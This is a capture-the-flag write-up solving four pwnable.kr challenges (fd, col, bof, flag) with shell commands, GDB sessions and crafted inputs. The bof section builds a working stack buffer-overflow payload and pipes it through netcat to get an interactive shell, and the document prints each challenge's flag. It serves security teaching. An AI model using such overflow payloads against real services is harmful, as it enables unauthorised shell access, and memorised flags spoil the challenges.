# 1. fd

Once logged in, there will be three files in the user's home:

+ `fd`, a binary
+ `fd.c`, the source of that binary
+ `flag` - _nope, you can't just `cat flag` :)_

The source of `fd` tells us that it will open a file descriptor with number `argv[1] - 0x1234` and, if it contains `LETMEWIN\n`, it'll show us the flag.

In Unix systems FDs are incremental, and the first three are defined as follows:

| Index | Stream |
| --- | --- |
| 0 | STDIN |
| 1 | STDOUT |
| 2 | STDERR |

Since `fd.c` shows that it'll be reading from an already open FD of its own process, a simple solution would be to pipe something into it: using the already available STDIN FD can be a good choice, but there's a catch: `fd` processes the FD number to read as `atoi(argv[1]) - 0x1234`, so we need to account for that offset when specifying its 1st parameter.

_0x1234_ must be converted to decimal (it'll be run through `atoi`, so no hex allowed), and that gives us the complete command...

```bash
echo "LETMEWIN" | ~/fd 4660
```

...and the flag: _mommy! I think I know what a file descriptor is!!_{: .spoiler}

# 2. col

This challenge has a similar structure: a binary, its source and the flag file are given.

This time `col.c` shows that the flag will be printed if the sum of the passcode given as an input equals to `0x21DD09EC` (568134124<sub>dec</sub>). It isn't a standard ASCII sum, though: the `argv[1]` char _(1 byte)_ array gets casted to an int _(4 bytes)_ array and a moving sum of the 5 first values will be done - hence the 20 bytes length specified in the inbuilt help.

Our passcode will need to be made of 5 **integer** blocks that sum up as the target value, so we can round up the target to the nearest multiple of 5 and the add back the remainder to the last block:

+ target = 568134124
+ remainder = 568134124 % 5 = 4
+ val1 = (target - remainder) / 5
+ val2 = val1 + remainder
+ passcode = (val1 * 4) + val2 = **(113626824 * 4) + 113626828**

This will need to be converted to a byte array to ensure the correct length: 113626824<sub>dec</sub>⇀0x06C5CEC8<sub>hex</sub> & 113626828<sub>dec</sub>⇀0x06C5CECC<sub>hex</sub>; `lscpu | grep -i order` tells us that this system is little-endian, so our final payload will become...

```bash
~/col "$(printf '\xc8\xce\xc5\x06%.0s' {1..4})$(echo -e '\xcc\xce\xc5\x06')"
```

...and the flag is: _daddy! I just managed to create a hash collision :)_{: .spoiler}

# 3. bof

This time we're directly provided with the downloadable source (and binary) of the program that's running @ `pwnable.kr:9000`; as its name implies we'll have to use a buffer overflow to get the flag, so GDB will step into the game: `gcc bof.c -m32 -g -o bof && gdb bof`.

_Note 1: compiling for 32bit simplifies memory address space and the debug symbols flag could be considered cheating, but we're provided the full source after all so why complicate the task further?_

_Note 2: I had wrongly compiled a [PIE executable](https://en.wikipedia.org/wiki/Position-independent_code#Position-independent_executables) and the memory mapping changed when the program was run, so I had to use GDB's [`starti`](https://sourceware.org/gdb/onlinedocs/gdb/Starting.html) command to run it and stop at the first instruction. You can either use the `-no-pie` flag when compiling the binary or avoid passing `--enable-default-pie` when building GCC from source._

We're interested in the `func` function since it contains the comparison that we need to force true to get the flag: `(gdb) list func`.

```c
void func(int key){
        char overflowme[32];
        printf("overflow me : ");
        gets(overflowme);       // smash me!
        if(key == 0xcafebabe){
                system("/bin/sh");
        }
        else{
                printf("Nah..\n");
        }
}
```

We want to target the `key == 0xcafebabe` comparison, in which `key` was previously defined in the code as `0xdeadbeef`; since it is referenced after `gets()` fills the `overflowme` buffer without a proper length check, we can use that to mangle memory and force the right side of the comparison to be equal to `key`.

With `(gdb) disas func` we can find the address of that comparison:

```text
Dump of assembler code for function func:
   0x565561cd <+0>:	push   %ebp
   0x565561ce <+1>:	mov    %esp,%ebp

   0x5655620b <+62>:	cmpl   $0xcafebabe,0x8(%ebp)    // <== Here's the key
```

Once we've found the address of the comparison, let's inspect further:

+ Set the breakpoint: `(gdb) break *0x0x5655620b`
+ Continue execution: `(gdb) c`
+ Feed some recognizable chars to the buffer (`!` is, for example, 0x41 in ASCII)
+ Check that we're inspecting the right buffer: `p overflowme`
+ Inspect the memory as hex words: `x/16x overflowme`

I've fed a bunch of `!`s as input, so my memory will contain easily spottable `0x21`s - let's view 16 hex words from the `overflowme` variable on:

```text
(gdb) x/16x overflowme
0xffffce9c:	0x21212121	0x21212121	0x21212121	0x21212121
0xffffceac:	0x21212121	0x21212121	0xf7f8ee00	0x00000000
0xffffcebc:	0x7029cb00	0xf7f8f3bc	0x00000000	0xffffcee8
0xffffcecc:	0x56556279	0xdeadbeef	0xffffcf94	0xffffcf9c
```

Here they are! Notice anything else? The `0xdeadbeef` key used for the comparison is located 13 words _(13 * 4 bytes)_ after the start of the `overflowme` buffer, let's see if we can overwrite it. _Note: Python helps us with quick strings manipulations, but v3 doesn't handle hex strings as v2 did so I've used `echo -e` as a quick & dirty workaround._

+ In another shell use `python -c 'print("!"*4*13)'` to generate the input.
+ Rerun the program: `(gdb) r`
+ Paste the generated input and wait for the breakpoint to kick in.
+ Inspect memory: `(gdb) x/16x overflowme`

```text
(gdb) x/16x overflowme
0xffffce9c:	0x21212121	0x21212121	0x21212121	0x21212121
0xffffceac:	0x21212121	0x21212121	0x21212121	0x21212121
0xffffcebc:	0x21212121	0x21212121	0x21212121	0x21212121
0xffffcecc:	0x21212121	0xdeadbe00	0xffffcf94	0xffffcf9c
```

As expected, the null terminator of the string overflowed and was written over the last byte of the key _(little endian system)_. Knowing this, we can craft a payload that will write the correct values onto that bytes and as such make the left side of the comparison equal to the expected right one.

+ `(gdb) run <<< $(echo -e $(python -c "print('!'*4*13)")\\xbe\\xba\\xfe\\xca)`
+ `(gdb) x/16x overflowme`

```text
(gdb) x/16x overflowme
0xffffce9c:	0x21212121	0x21212121	0x21212121	0x21212121
0xffffceac:	0x21212121	0x21212121	0x21212121	0x21212121
0xffffcebc:	0x21212121	0x21212121	0x21212121	0x21212121
0xffffcecc:	0x21212121	0xcafebabe	0xffffcf00	0xffffcf9c
```

Et voilà! The comparison will now succeed. Let's quit GDB and run the same payload over netcat - running it locally would give us a shell on our system since the program will spawn `/bin/sh`.

+ `echo -e $(python -c "print('!'*4*13)")\\xbe\\xba\\xfe\\xca | nc pwnable.kr 9000`{: .spoiler}

It seems that this does nothing, shell commands won't give any output... That's because the spawned process terminates immediately since STDIN does not get tied to it. A simple - yet obscure - workaround is using `cat` to keep the pipe open:

+ `(echo -e $(python -c "print('!'*4*13)")\\xbe\\xba\\xfe\\xca; cat -) | nc pwnable.kr 9000`{: .spoiler}

It won't look like it but you are now effectively interacting with a shell:

```sh
pwd         # Check the working directory
ls -l       # Look for the flag
cat flag    # Grab it!
```

The flag is: _daddy, I just pwned a buFFer :)_{: .spoiler}

# 4. flag

We're only given a seemingly ordinary binary to play with:

```bash
> file ./flag
flag: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, no section header

> chmod +x flag && ./flag
I will malloc() and strcpy the flag there. take it.
```

It looks like we'll have to look for a `malloc` call in the code. GDB doesn't show anything useful:

```text
> gdb ./flag
...
gdb$ info functions
All defined functions:
gdb$
```

Symbols must have been stripped, let's see what a raw `strings` analysis can yield:

```text
> strings ./flag
...

...
```

In the sea of characters written to screen, a clear hint is found: this binary has been compressed with UPX! Running `upx -l ./flag` indeed confirms it:

```text
> upx -l ./flag

```

Unpacking is easy: `upx -d ./flag` - _Note: your file will be overwritten!_

```bash
> file ./flag
flag: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=96ec4cc272aeb383bd9ed26c0d4ac0eb5db41b16, not stripped
```

Now GDB has something to work on:

```text

```

How nice of GDB, it even located the flag's buffer for us. Let's leverage that:

```text
gdb$ b *0x401184
Breakpoint 1 at 0x401184
gdb$ c
Continuing.
I will malloc() and strcpy the flag there. take it.

Breakpoint 1, 0x0000000000401184 in main ()
gdb$ p flag
'flag' has unknown type; cast it to its declared type
```

A bit of poking around and we get the contents of the buffer right away:

```text
gdb$ p (int) flag
$1 = 0x496628
gdb$ p (char) flag
$2 = 0x28
gdb$ p (char*) flag
$3 = 0x496628 "UPX...? sounds like a delivery service :)"
```
